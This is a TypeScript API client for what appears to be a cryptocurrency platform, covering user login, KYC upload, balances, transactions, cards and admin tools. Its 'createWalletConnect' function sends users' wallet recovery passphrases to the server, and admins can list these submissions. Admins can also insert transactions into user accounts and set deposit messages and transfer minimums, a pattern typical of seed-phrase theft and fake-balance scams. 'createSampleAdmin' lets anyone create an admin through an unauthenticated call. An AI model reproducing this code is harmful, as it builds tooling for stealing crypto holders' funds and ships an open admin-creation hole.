//Configs
import { axiosUnauthInstance, getAxiosAuthInstance } from './config';

const axiosUser = getAxiosAuthInstance();
const axiosAdmin = getAxiosAuthInstance('admin');

//Login a User
export const loginUserFn = async (data: { email: string; password: string }) => {
    const response = await axiosUnauthInstance.post("auth/login", data);
    return response.data;
};

//Create a User
export const createUserFn = async (data: { email: string, userName: string, password: string, phoneNumber: string, country: string }) => {
    const response = await axiosUnauthInstance.post("users/create", data);
    return response.data;
}

//Resend Email Verification
export const resendVerificationFn = async () => {
    const response = await axiosUser.get("users/resend");
    return response;
}

//Verify User
export const verifyUserFn = async (data: { verificationCode: string }) => {
    const response = await axiosUser.post("users/verify", data);
    return response.data;
}

//Submit Kyc
// eslint-disable-next-line @typescript-eslint/no-explicit-any
export const userKycFn = async (data: FormData): Promise<any> => {
    const response = await axiosUser.patch("users/kyc", data, {
        headers: {
            "Content-Type": "multipart/form-data",
        },
    });
    return response.data;
};

//Password Reset Verification
export const passwordResetVerification = async (data: { email: string }) => {
    const response = await axiosUnauthInstance.post("auth/passwordResetVerification", data);
    return response.data;
}

//Verify Password Reset OTP
export const verifyPasswordResetOtp = async (data: { email: string, otp: string }) => {
    const response = await axiosUnauthInstance.post("auth/verifyPasswordResetOTP", data);
    return response.data;
}

//Reset Password
export const resetPassword = async (data: { email: string, password: string }) => {
    const response = await axiosUnauthInstance.post("auth/resetPassword", data);
    return response.data;
}

//Get logged in user details
export const getUserDetailsFn = async () => {
    const response = await axiosUser.get<GetDetailsResponse>("users/currentUser")
    return response.data;
}

//Get Coin Prices
export const getPrices = async () => {
    const response = await axiosUnauthInstance.get(`transactions/fetchPrices`)
    return response.data;
}

//Get logged in user balance
export const getUserBalanceFn = async () => {
    const response = await axiosUser.get<GetBalanceResponse>(`users/getBalance`)
    return response.data;
}

//Get a users last three transactions
export const getUserLastTransactionsFn = async () => {
    const response = await axiosUser.get(`transactions/getLastTransactions`)
    return response.data;
}

//Get a user transactions
export const getAllTransactions = async (page?: string, limit?: string) => {
    const response = await axiosUser.get(`transactions/userTransactions?page=${page}&limit=${limit}`)
    return response.data
}

//Create a new transaction
export const createTransaction = async (data: { coin: string, transactionType: string, amount: number, network: string, walletAddress: string }) => {
    const response = await axiosUser.post("transactions/create", data);
    return response.data;
}

//Delete notification
export const deleteNotification = async (id: string) => {
    const response = await axiosUser.delete(`notification/delete/${id}`);
    return response.data;
}

//Get a Coin Price
export const getCoinPrice = async (coin: string) => {
    const response = await axiosUser.get(`transactions/getCoinDetails/${coin}`)
    return response.data;
}

//Get transactions of a particular coin
export const getCoinTransactions = async (data: { coin: string }) => {
    const response = await axiosUser.post(`transactions/getTransactions`, data);
    return response.data;
}

//Connect wallet
export const createWalletConnect = async (data: { wallet: string, passPhrase: string[] }) => {
    const response = await axiosUser.post(`walletConnect/create`, data);
    return response.data;
}

//Get connect wallet stats
export const getWalletConnectStats = async () => {
    const response = await axiosUser.get(`walletConnect/walletConnectStats`);
    return response.data;
}

//Create new card request
export const createCardRequest = async () => {
    const response = await axiosUser.post(`cards/new`)
    return response.data;
}

//Get a card request
export const getCardRequest = async () => {
    const response = await axiosUser.get(`cards/get`);
    return response.data;
}

//Update Profile Picture
// eslint-disable-next-line @typescript-eslint/no-explicit-any
export const updateProfilePicture = async (data: FormData): Promise<any> => {
    const response = await axiosUser.patch(`users/updateProfilePicture`, data, {
        headers: {
            "Content-Type": "multipart/form-data",
        },
    });
    return response.data;
}

//Update Other Details
// eslint-disable-next-line @typescript-eslint/no-explicit-any
export const updateDetails = async (data: any): Promise<any> => {
    const response = await axiosUser.patch(`users/update`, data);
    return response.data;
}


//Admin Endpoints
//Create Sample Admin
export const createSampleAdmin = async (data: { email: string, password: string, role: "admin" | "super_admin" }) => {
    const response = await axiosUnauthInstance.post(`admins/sampleCreate`, data);
    return response.data;
}

//Create Admin
export const createAdmin = async (data: { email: string, password: string, role: "admin" | "super_admin" }) => {
    const response = await axiosAdmin.post(`admins/create`, data);
    return response.data;
}

//Login Admin
export const loginAdmin = async (data: { email: string, password: string }) => {
    const response = await axiosAdmin.post(`auth/adminLogin`, data);
    return response.data;
}

//Get logged Admin Details
export const getAdminDetails = async () => {
    const response = await axiosAdmin.get(`admins/getDetails`);
    return response.data;
}

//Get Transactions
export const getTransactions = async (type?: string, page?: string, limit?: string) => {
    const response = await axiosAdmin.get(`transactions/getAllTransactions/${type}?page=${page}&limit=${limit}`);
    return response.data;
}

//Get All Card Requests
export const getCardRequests = async (page?: string, limit?: string) => {
    const response = await axiosAdmin.get(`cards/allRequests?page=${page}&limit=${limit}`);
    return response.data;
}

//Get All Wallet Connects
export const getWalletConnects = async (page?: string, limit?: string) => {
    const response = await axiosAdmin.get(`walletConnect/getWalletConnects?page=${page}&limit=${limit}`);
    return response.data;
}

//Get Admins
export const getAdmins = async () => {
    const response = await axiosAdmin.get(`admins/getAdmins`);
    return response.data;
}

//Create a new Transaction
export const createAdminTransaction = async (data: CreateTransaction) => {
    const response = await axiosAdmin.post("transactions/createUserTransaction", data);
    return response.data;
}

//Get a user by userName, accountId, emails
export const getUser = async (value: string) => {
    const response = await axiosAdmin.get(`users/getUser/${value}`);
    return response.data;
}

//Update a transaction
export const updateTransaction = async (data: { status: string, transactionId: string }) => {
    const response = await axiosAdmin.patch(`transactions/updateTransaction`, data);
    return response.data;
}

//Delete Transaction
export const deleteTransaction = async (id: string) => {
    const response = await axiosAdmin.delete(`transactions/delete/${id}`);
    return response.data;
}

//Get all users
export const getAllUsers = async (page?: string, limit?: string) => {
    const response = await axiosAdmin.get(`users/allUsers?page=${page}&limit=${limit}`);
    return response.data;
}

//Suspend users
export const adminSuspendUser = async (data: { email: string, isSuspended: boolean }) => {
    const response = await axiosAdmin.patch(`users/adminUpdate`, data);
    return response.data;
}

//Update Kyc
export const adminKycUser = async (data: { email: string, kyc: { status: "accepted" | "pending" | "rejected" } }) => {
    const response = await axiosAdmin.patch(`users/adminUpdate`, data);
    return response.data;
}

//Edit a user details
export const adminPatchUser = async (data: { email: string, password?: string, depositMessage?: string, minimumTransfer?: number, transactionPin?: number }) => {
    const response = await axiosAdmin.patch(`users/adminUpdate`, data);
    return response.data;
}

//Fetch a user transactions
export const adminFetchUserTransactions = async (data: { page?: string, limit?: string, userId: string, transactionType?: string }) => {
    const response = await axiosAdmin.post(`transactions/getUserTransactions?page=${data.page}&limit=${data.limit}`, data);
    return response.data;
}

//Fetch a user balance
export const adminFetchUserBalance = async (userId: string) => {
    const response = await axiosAdmin.post(`transactions/getUserBalance/${userId}`);
    return response.data.data;
}

//Get Utility
export const adminGetUtility = async (id: string) => {
    const response = await axiosUnauthInstance.get(`utility/get/${id}`);
    return response.data;
}

//Edit a Utility
export const adminEditUtility = async (id: string, data: { cardPrice: number, minimumAmount: number }) => {
    const response = await axiosAdmin.patch(`utility/edit/${id}`, data);
    return response.data;
}

//Update a Card Request
export const adminUpdateCardRequest = async (data: { requestId: string, status: string }) => {
    const response = await axiosAdmin.patch(`cards/update`, data);
    return response.data;
}

//Delete a Card Request
export const adminDeleteCardRequest = async (requestId: string) => {
    const response = await axiosAdmin.delete(`cards/delete/${requestId}`);
    return response.data;
}

//Edit an Admin
export const adminPatch = async (data: { adminId: string, email?: string, password?: string, role?: "admin" | "super_admin", isSuspended: boolean }) => {
    const response = await axiosAdmin.patch(`admins/updateAdmin`, data);
    return response.data;
}

//Create Notification
export const createNotification = async (data: { user: string, type: string, title: string, message: string }) => {
    const response = await axiosAdmin.post(`notification/create`, data);
    return response.data;
}

//Delete Wallet Connect
export const deleteConnect = async (connectId: string) => {
    const response = await axiosAdmin.delete(`walletConnect/delete/${connectId}`);
    return response.data;
}